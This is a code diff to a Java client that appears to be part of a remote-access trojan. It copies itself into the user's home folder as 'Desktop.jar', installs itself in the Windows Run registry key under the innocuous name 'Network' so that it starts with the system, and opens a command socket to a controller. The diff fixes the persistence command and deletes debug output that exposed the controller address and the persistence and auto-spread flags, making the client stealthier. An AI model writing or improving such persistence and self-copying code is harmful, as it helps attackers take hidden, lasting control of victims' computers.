@@ -3,6 +3,7 @@ package Client;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.concurrent.TimeUnit;
 
 public class Client {
     private static String HOST = "localhost";
@@ -100,15 +101,17 @@ public class Client {
         File newClient = new File(System.getProperty("user.home") + "/Desktop.jar");
         copyFile(client, newClient);
         if (SYSTEMOS.contains("Windows")) {
-            createPersistence(System.getProperty("user.home") + "/Desktop.jar");
+            createPersistence(System.getProperty("user.home") + "\\Desktop.jar");
         }
     }
 
     private void createPersistence(String clientPath) {
-        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Network /d " + clientPath);
+        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Network /d " + "\"" + clientPath + "\"");
         try {
             Process proc = pb.start();
-        } catch (IOException e) {
+            proc.waitFor(2, TimeUnit.SECONDS);
+            proc.destroyForcibly();
+        } catch (IOException | InterruptedException e) {
             e.printStackTrace();
         }
     }
@@ -118,9 +121,6 @@ public class Client {
             socket = new Socket(getHOST(), getPORT());
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
-
-            System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            System.out.println("p: " + isPersistent + " a: " + autoSpread);
             while (true) {
                 String input;
                 try {
